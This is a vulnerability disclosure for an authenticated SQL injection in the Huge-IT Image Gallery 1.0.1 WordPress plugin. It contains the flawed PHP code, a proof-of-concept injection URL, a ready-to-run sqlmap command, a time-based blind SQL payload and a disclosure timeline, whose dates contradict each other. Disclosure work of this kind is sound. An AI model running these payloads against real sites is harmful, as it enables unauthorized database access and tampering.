@@ -1,0 +1,94 @@
+######################
+# Exploit Title : Wordpress Huge-IT Image Gallery 1.0.1 Authenticated SQL Injection
+
+# Exploit Author : Claudio Viviani
+
+# Vendor Homepage : http://huge-it.com/
+
+# Software Link : http://downloads.wordpress.org/plugin/gallery-images.zip
+    Mirror Link : https://mega.co.nz/#!3EoUzSQI!yrl75XQsp1ggxDCjW-wq7yUxLdbLu0WHPNFcJAxJOHs
+
+# Date : 2014-08-25
+
+# Tested on : Windows 7 / Mozilla Firefox
+#             Linux / Mozilla Firefox
+#             Linux / sqlmap 1.0-dev-5b2ded0
+
+######################
+
+# Location :  
+http://localhost/wp-content/plugins/gallery-images/admin/gallery_func.php
+
+######################
+
+# Vulnerable code :
+
+function editgallery($id)
+  {
+
+          global $wpdb;
+
+          if(isset($_GET["removeslide"])){
+             if($_GET["removeslide"] != ''){
+
+
+          $wpdb->query("DELETE FROM ".$wpdb->prefix."huge_itgallery_images  WHERE id = ".$_GET["removeslide"]." ");
+
+
+
+           }
+           }
+
+######################
+
+# PoC Exploit:
+
+http://localhost/wordpress/wp-admin/admin.php?page=gallerys_huge_it_gallery&task=edit_cat&id=1&removeslide=1 and 1=2
+
+
+# Exploit Code via sqlmap:
+
+sqlmap --cookie="INSERT_WORDPRESS_COOKIE_HERE" -u "http://localhost/wordpress/wp-admin/admin.php?page=gallerys_huge_it_gallery&task=edit_cat&id=1&removeslide=1" \
+-p removeslide --dbms=mysql --level 3
+
+[20:38:20] [INFO] GET parameter 'removeslide' is 'MySQL >= 5.0 time-based blind - Parameter replace' injectable
+...
+...
+...
+---
+Place: GET
+Parameter: removeslide
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0 time-based blind - Parameter replace
+    Payload: page=gallerys_huge_it_gallery&task=edit_cat&id=1&removeslide=(SELECT (CASE WHEN (5440=5440) THEN SLEEP(5) ELSE 5440*(SELECT 5440 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))
+---
+
+
+# PoC Video:
+
+https://www.youtube.com/watch?v=gAmb0_o3ZUc
+
+######################
+
+# Vulnerability Disclosure Timeline:
+
+2014-08-25:  Discovered vulnerability
+2014-08-26:  Vendor Notification (Web Customers Service Form)
+2014-08-26:  No Response/Feedback 
+2014-08-01:  Plugin version 1.0.1 released without fix 
+2014-08-02:  Public Disclosure
+ 
+#####################
+
+Discovered By : Claudio Viviani
+                http://www.homelab.it
+		
+                info@homelab.it
+                homelabit@protonmail.ch
+
+                https://www.facebook.com/homelabit
+                https://twitter.com/homelabit
+                https://plus.google.com/+HomelabIt1/
+                https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww
+
+#####################
